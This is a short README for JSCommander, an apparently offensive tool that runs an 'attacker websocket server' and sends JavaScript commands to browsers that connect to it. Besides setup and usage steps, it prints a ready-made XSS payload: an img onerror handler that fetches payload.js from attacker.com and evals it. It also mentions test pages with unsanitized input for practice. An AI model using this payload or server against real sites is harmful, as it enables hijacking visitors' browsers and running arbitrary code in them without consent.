# JSCommander
Issue JS commands remotely when clients connect to your attacker websocket server

Inspired by https://www.nullpt.rs/hacking-gta-servers-using-web-exploitation

# Install
```bash
python3 -m venv .venv
source ./.venv/bin/activate
python3 -m pip install -r requirements.txt
```

# Usage
Run the server
```bash
python3 JSCommnder-server.py
```

Control panel is only accessible from localhost on the machine you run me on. Available at http://localhost:8080/control_panel.html

You can use XSS payloads to connect to the websocket server. i.e:
```html
<img src="#" onerror='fetch(`http://attacker.com:8081/payload.js`).then(res=>res.text().then(r=>eval(r)))' style="display:none" />
``` 

There are 2 testing HTML files to play with.
- `test_client.html` simply connects to the webocket server upon opening it in your browser.
- `test_client2.html` has an unsanitized input for practicing with XSS payloads.